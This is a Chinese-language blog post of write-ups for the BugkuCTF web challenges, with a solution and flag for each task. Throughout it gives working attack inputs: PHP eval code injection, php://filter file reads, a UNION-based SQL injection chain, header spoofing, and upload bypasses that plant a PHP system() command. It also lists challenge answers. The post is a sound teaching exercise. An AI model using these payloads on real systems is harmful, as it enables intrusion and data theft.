---
layout: post
title: "BugkuCTF-WEB-WriteUp"
date: 2019-05-05 01:01:01
share: true
toc: true
tags: 
 - CTF
---


BugkuCTF-WEB-WriteUp

## Web2
![](http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3ZnZsTS9jTEdtMFJHNkZBbTBZaXFjWG50ang0WUIzZi9RPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 解题
- 打开网站如下（一片滑稽）

  ![](http://imglf5.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3VjhGVDdVYnhlTy9jNDhLcXVENjB3bWlTTXBiNW1ZU3FRPT0.png?imageView&thumbnail=1920y1030&type=png&quality=96&stripmeta=0)

- 查看源代码

  ![](http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3VUljRWp6Ym4za0dpR29MYXlVbFgyZWt3U2ZlV2h6MldRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 得到flag
- Flag
KEY{Web-2-bugKssNNikls9100}



## 计算器

![](http://imglf5.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3WFkwODhVTTd6VTdkdjRFeVRuZlZ1MTdTQVQ0QmYwQjBRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 解题

- 打开网址输入结果，发现只能输入一位数字

  ![](http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3WDhFMGU3OGdWNktDMUV6L256N1RCYUJLWHExTWhYNE1RPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 查看元素找到maxlength

  ![](http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3YnZHVjRCUWxHYW9DVHZ5L2taNWpiZDhvSWNFblJ4N2ZRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 修改maxlength = 3

- 输入正确答案

  ![](http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3U01MM0NGQU4xczMxdWtoU1FGM04vblhnN0c3T0lvZlVBPT0.png?imageView&thumbnail=1920y392&type=png&quality=96&stripmeta=0)

- Flag
flag{CTF-bugku-0032}


## web基础$_GET 
![](http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUnFWUm8wZkROVnNiUURDQ2xLQ3Jrc2QxSDlRN0luOWRBPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 解题
- 打开网址
  ![](http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrY3kwcHhlNHk5NTRZaHFzbGl1RkZleml2bDhnNGtNdlJ3PT0.png?imageView&thumbnail=500x0&quality=96&stripmeta=0)

- 通过阅读代码得知用get提交数据即可

- 地址加?what=flag

- 打开修改后的网址

  ![](http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrZmVLRnhnSnlSaGxWd29ubXdKeVFKM0hTTVo4d2hMWGJ3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)
- Flag
flag{bugku_get_su8kej2en}

- 相关知识
- $_GET 

  > 1、预定义的 $_GET 变量用于收集来自 method=“get” 的表单中的值。
  >
  > 2、 从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。

- $_POST

  > 1、预定义的 $_POST 变量用于收集来自 method=“post” 的表单中的值。
  >
  > 2、从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。

## web基础$_POST

![](http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrZldCaWlscVNzUFA2OXlsOFU4RTlaZzdzOWZ0cTYxQzdRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 解题

- 打开网址

  ![](http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrY3pXcURLdzVkQmlFWWxJMGRjbVg0TUtpVXlSbmxZWG1BPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 阅读可知通过post提交数据

- 使用Firefox扩展hackbar；填写url；填写post_data为what=flag；execute

  ![](http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrVndVcDNUQ1VRNnNoQnpVb0NRaDJEcll4UFNUTXdXL2p3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- execute后

  ![](http://imglf5.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUkljTVpVUEo5VHZaNmtwQWowNnVoREN0WW5jODlsODBBPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 或者bp抓包 改变请求方式 空一行加上`what=flag` -foward 网页会显示flag
- Flag
flag{bugku_get_ssseint67se}


## 矛盾

![](http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUThLWko4bnBNc2xkQkQ4ZU5haUhPNXlTOVU2S2VwQXFBPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 解题
- 打开网址

  ![](http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUjBGN0tGcktDT1pmVzBMR1dPMXFabStHVU5wOFdsVWp3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)

- 阅读可得知数据用get传参

- 有两个条件判断，当num不是数字或数字串(not numeric)同时num等于1时 返回flag，此为矛盾。

- “==”有数据类型转换，所以num取1xxx格式任意由1和字母组成的串即可。

- 修改地址

  ![](http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrYkhLeGQwemZNU2NOTkY2dlg1MXFJcW13bnFyczZZSHR3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0)
- Flag
flag{bugku-789-ps-ssdf}

## web3
循环弹窗
- 阻止此页面创建更多对话框
- 看下源码 发现`<!-->`注释含有& # 数字组成字符串为html编码
- 解码得flag
- KEY{J2sa42ahJK-HS11III}

## 域名解析
题目：听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag
- 把`123.206.87.240 flag.baidu.com`加入host文件中
- 访问flag.baidu.com即可
- KEY{DSAHDSJ82HDS2211}

## 你必须让他停下
页面不断地跳
- 看源代码发现是js脚本不断刷新
  - burpsuite_pro抓包分析 send to repeater逐个go
- 或者干脆禁用js 参考相应浏览器设置
- flag{dummy_game_1s_s0_popular}

## 本地包含
看题目猜测有本地包含漏洞
```php
<?php
error_reporting(0);

include 'flag.php';
$a = @$_REQUEST['hello'];
eval(" var_dump( $a );");
highlight_file(__FILE__);
?> 
```
- 首先包含了flag.php 其次获取helle值 其次打印了变量相关信息
- 通过hello值构造payload打印flag.php代码`?hello=1);show_source('flag.php');var_dump(3`
- 或者`?hello= 1);print_r(file("./flag.php%22")`
- 看到flag
- flag{bug-ctf-gg-99}

## 变量1
提示我们flag In the variable ! 看到$$args 想到全局变量GLOBALS
- ```php
  <?php  
  error_reporting(0);
  include "flag1.php";
  highlight_file(__file__);
  if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
      eval("var_dump($$args);");
  }
  ?>
  ```
  阅读得知`preg_match("/^\w+$/",$args)`输入args得满足此正则表达式
- 构造payload输出GLOBALS内容`?args=GLOBALS`
- flag{92853051ab894a64f7865cf3c2128b34}

## web5
hint：JSPFUCK??????答案格式CTF{**}
- 看下源码含有`[][(![]+[])[+[]]+([![]]+[][[]])...`
- 把此代码丢进console运行
- ctf{whatfk}"

## 头等舱
连接是以hd.php结尾 hint：hidden提示
- 源码啥也没有抓个包
- 在response-raw中看到了flag
- flag{Bugku_k8_23s_istra}

## 网站被黑
一个被黑的网页 hint：链接以webshell结尾
- 用脚本扫一下看到`http://123.206.87.240:8002/webshell/shell.php`
- 登录页面有密码 抓包爆破一下
- 得到密码hack登录
- flag{hack_bug_ku035} 

## 管理员系统
随便输入账号密码提示：IP禁止访问，请联系本地管理员登陆，IP已被记录. 
hint：本地管理员
- 查看源码有注释base64竟然在最底下中间空了很大空白
- 解码得test123
- <mark>X-Forwarded-For</mark>
- 伪造xff头`X-Forwarded-For: 127.0.0.1`添加到raw中
- go raw中出现flag
- The flag is: 85ff2ee4171396724bae20c0bd851f6b

## web4
hint：看看源代码
- 查看源码两个变量p1 p2是由% 数字组成的字符串 还有额外类似字符串代码提示unescape 为escape编码
- 解码按照代码提示合并得
  ```php
  function checksubmit(){
    var a=document.getelementbyid("password");
    if("undefined"!=typeof a){
      if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
        return!0;
      alert("error");
      a.focus(); 
      return!1
        }
      }
      document.getelementbyid("levelquest").onsubmit=checksubmit;
  ```
- 代码意思大致是password=67d709b2b54aa2aa648cf6e87a7114f1
- 输入字符串
- KEY{J22JK-HS11}

## flag在index里
标题提示index 看下源码没提示 猜测index.php里flag
- 文件包含漏洞 利用php://filter读取base64编码源码后的代码
- 构造payload`index.php?file=php://filter/convert.base64-encode/resource=index.php`
- 解码阅读源码看到flag
- flag{edulcni_elif_lacol_si_siht}

## 输入密码查看flag
url=http://123.206.87.240:8002/baopo/ hint：爆破
密码五位数
- 密码13579 登录
- baopo好慢..
- flag{bugku-baopo-hah} 

## 点击一百万次
打开好像让我们点击一百万次
- 看源码js确实从0开始 修改变量初始值为999999
- 用harkbar修改clicks=1000001
- flag{bugku-baopo-hah} 

## 备份是个好习惯
打开网址 得hex代码 转换成ASCII失败 应该不是hex
hint：备份
- 用py扫一下目录得到 http://123.206.87.240:8002/web16/index.php.bak
- 下载打开

```php
<?php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);  
echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
  echo $flag."取得flag";
}
?>  
```
- 大致意思是读取url参数并且把字符key去掉`md5($key1) == md5($key2) && $key1 !== $key2`条件满足后输出flag
- kekeyy代替key
- 第一个方法
  - mad无法处理数组 默认返回null
  - `?kekeyy[]=something&kekeyy[]=anything`
- 第二个方法： 
  两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的
  所以找出加密后0e开头的字符串
  ```
  QNKCDZO
  240610708
  s878926199a
  s155964671a
  s214587387a
  s214587387a
  ```
  - `?kekeyy1=240610708&kekeyy2=QNKCDZO`
- Bugku{OH_YOU_FIND_MY_MOMY}

## 成绩单查询
标准sql注入题
- hackbar注入`id=1'#` 成功
- 判断列数`id=1' order by 4#`四列，五列测试不对
- 联合查询`id=0' union select 1,2,3,4#`z成功
- 查询`id=0' union select 1,database(),user(),version()#`
- 看到数据库名称含有flag
  `skctf_flag	  skctf_flag@localhost	  5.5.34-log`
- 查询表名 `id=0' union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema='skctf_flag')#`得到表名fl4g
- 查询表的列名`id=0'union select 1,2,3,(select group_concat(column_name)
 from information_schema.columns where table_name='fl4g')#`得出列skctf_flag
- 查询数据`id=0' union select 1,2,3,(select skctf_flag from fl4g)#`
- BUGKU{Sql_INJECT0N_4813drd8hz4}

## 秋名山老司机
题目：亲请在2s内计算老司机的车速是多少
1453188555*112050552*2035911046+129564843-990655641*10801555*1826101406-742934982+1688885834-387627083+502307721=?;
车速太快人不行了 借助py
- 看看前辈 https://www.jianshu.com/p/b0a5d72c8bae
  ```python
  #改一下url
  import requests
  import re
  url = 'http://120.24.86.145:8002/qiumingshan/'
  s = requests.Session()
  source = s.get(url)
  expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()
  result = eval(expression)
  post = {'value': result}
  print(s.post(url, data = post).text)  
  ```
- 跑了好几次
- Bugku{YOU_DID_IT_BY_SECOND}

## 速度要快
打开网页：我感觉你得快点!!!
- 看源码有注释
- 抓包看一下raw中有base64 解码后验证不是flag
- 每一次go base64都不一样
- 写脚本
  ```python
  #coding:utf-8
  import requests
  import base64

  url='http://123.206.87.240:8002/web6/'
  s=requests.Session()
  header=s.get(url).headers
  #print(header)
  flag = base64.b64decode(base64.b64decode(header['flag']).decode() .split(':')[1]).decode() #对其进行base64两次解密

  data={'margin':flag}

  print(s.post(url=url,data=data).content.decode())
  ```
- KEY{111dd62fcd377076be18a}

## cookies欺骗
打开网址 url=http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=
- 好像有base64 解码得`keys.txt`
- 尝试用filename访问index.php（原url使用base64，这也将index.php进行编码`aW5kZXgucGhw`
- 构造 http://123.206.87.240:8002/web11/index.php?line=1&filename=aW5kZXgucGhw
- 显示信息切换行数都有 写脚本获取全部代码
  ```python 
  import requests
  a=30
  for i in range(a):
      url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw" 
      s=requests.get(url)
      print s.text
  ```
得到源代码
  ```php
  <?php
  error_reporting(0);
  $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
  $line=isset($_GET['line'])?intval($_GET['line']):0;
  if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
  $file_list = array(
  '0' =>'keys.txt',
  '1' =>'index.php',
  );
  if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
  $file_list[2]='keys.php';
  }
  if(in_array($file, $file_list)){
  $fa = file($file);
  echo $fa[$line];
  }
  ?>
  ```
- 阅读得知cookie margin=margin
- 抓包raw加上Cookie: margin=margin 修改filename=a2V5cy5waHA=  然后go
- KEY{key_keys}

## never give up
url=http://123.206.87.240:8006/test/hello.php
显示：never never never give up !!! 
- 源码提1p.html 访问 123.206.87.240:8006/test/1p.html结果跳转bugku论坛
- 看一下这1p.html源码 view-source:http://123.206.87.240:8006/test/1p.html
- Words变量的值先url解码，再base64解码，再url解码
```php
  ";if(!$_GET['id'])
{
    header('Location: hello.php?id=1');
    exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
    echo 'no no no no no no no';
    return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
    require("f4l2a3g.txt");
}
else
{
    print "never never never give up !!!";
}
?>
```
- 看到f4l2a3g.txt 这个竟然能直接访问 http://123.206.87.240:8006/test/f4l2a3g.txt
- flag{tHis_iS_THe_fLaG}

## welcome to bugkuctf
挂了

## 过狗一句话
挂了

## 字符？正则？
```
.                                  匹配除 "\n" 之外的任何单个字符

*                                 匹配它前面的表达式0次或多次，等价于{0,}

{4,7}                           最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符

\/                                匹配 / ，这里的 \ 是为了转义

[a-z]                           匹配所有小写字母

[:punct:]                     匹配任何标点符号

/i                                表示不分大小写
```
- payload`?id=keykeyaaaakey:/a/keyz;`
- KEY{0x0SIOPh550afc}

## 前女友(SKCTF)
打开网址查看源代码发现code.txt
- 根据代码构造payload`http://123.206.31.85:49162/index.php?v1[]=a&v2[]=b&v3[]=10`
- 题目类似 备份是个好习惯
- SKCTF{Php_1s_tH3_B3St_L4NgUag3}

## login1(SKCTF)
hint:SQL约束攻击 打开网址一个管理系统登录页面
可以注册 登录账号后显示：不是管理员还想看flag？！ 
注册账号admin 显示账号已存在
- 看看这篇文章https://www.freebuf.com/articles/web/124537.html
- 大致两点信息-
  - sql有字符串约束条件例如最长15字符 输入字符16的字符串 只会存储前字符15
  - sql处理字符串默认修建空格 "abc"=="abc   "
- 所以我们注册"admin   " 在用这个账户登录即可
- SKCTF{4Dm1n_HaV3_GreAt_p0w3R} 

## 你从哪里来
url=http://123.206.87.240:9009/from.php
显示areyoufrom google?
- 抓包添加referer`Referer: https://www.google.com`  -go
- 或者直接在hackbar里添加referer
- HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。
- flag{bug-ku_ai_admin}

## md5 collision(NUPT_CTF)
url=http://123.206.87.240:9009/md5.php
显示：please input a
hint：md5 collision MD5碰撞
- 所以分析我们要传入参数a a值为MD5加密后0e开头
- 抓包 在md5.php加上get参数`？a=s155964671a` 
- go 看到flag
- 最好抓包分析一下传参方式
- flag{md5_collision_is_easy}

## 程序员本地网站
hint：请从本地访问
这道题很前面那道 管理员系统类似 构造xff
- 抓包添加`X-Forwarded-For: 127.0.0.1` -go
- flag{loc-al-h-o-st1}

## 各种绕过
题目：各种绕过呦 打开url看见代码如下 算是一道代码审计
```php
 <?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])
        print 'passwd can not be uname.';
    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET
                                                  ['id']=='margin'))
        die('Flag: '.$flag);
    else
        print 'sorry!';
}
?> 
```
- 阅读可知三个参数uname id passwd 前两个get传参 后者post
- 阅读代码 uname不能和passwd相等 但要满足sha1二者值相等 想当然想到了MD5类似
  构造数组
- 构造payload`?uname[]=0&id=margin` 同时用hackbar输入postdata`passwd[]=1`
- flag{HACK_45hhs_213sDD}

## web8
题目：txt？？？ 打开url 又是一道代码审计 hint:flag.txt
```php
<?php
extract($_GET);
if (!empty($ac))
{
  $f = trim(file_get_contents($fn));
  if ($ac === $f)
  {
    echo "<p>This is flag:" ." $flag</p>";
  }
  else
  {
    echo "<p>sorry!</p>";
  }
}
?>
```
- 根据hint 访问http://123.206.87.240:8002/web8/flag.txt 显示文本flags
  - 阅读代码可知f为fn的内容 ac===f时 输出flag
  - 构造payload`?ac=flas&fn=flag.txt`
- flag{3cfb7a90fc0de31}

## 细心
题目：想办法变成admin
打开一看还以为题目挂了 然而看下http 是200
- 看下源码啥也没有 好久没扫了 发现有robots.txt
```
User-agent: *
Disallow: /resusl.php
```
- 访问resusl.php 提示`if ($_GET[x]==$password) 此处省略1w字`
- 结合admin提示？`?x=admin`成功了？？
- flag(ctf_0098_lkji-s)

## 求getshell
题目很明显 打开显示`My name is margin,give me a image file not a php`
可以上传文件 不让我上传php？我偏不
- 抓包 上传一个1.php
- Content-Type的multipart/form-data 任意字符改成大写绕过 
- Content-Type改成image/jpg
- filename=1.php5
- go可拿到key
- KEY{bb35dc123820e}

## INSERT INTO注入

## 这是一个神奇的登陆框

## 多次

## PHP_encrypt_1(ISCCCTF)

## 文件包含2
hint：文件包含
- 看源码发现upload.php  `file=upload.php`
- 可以上传文件 显示请上传jpgpnggif格式文件
- 构造文件 打印出目录文件名
```js
<script language=php>system("ls")</script>
```
保存为`1.php;.jpg` 上传成功
- 根据网页显示访问 ?file=upload/201908230711481901.jpg
- 显示`about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php`
- 看到txt文件访问`http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt`得出key
- SKCTF{uP104D_1nclud3_426fh8_is_Fun}




  





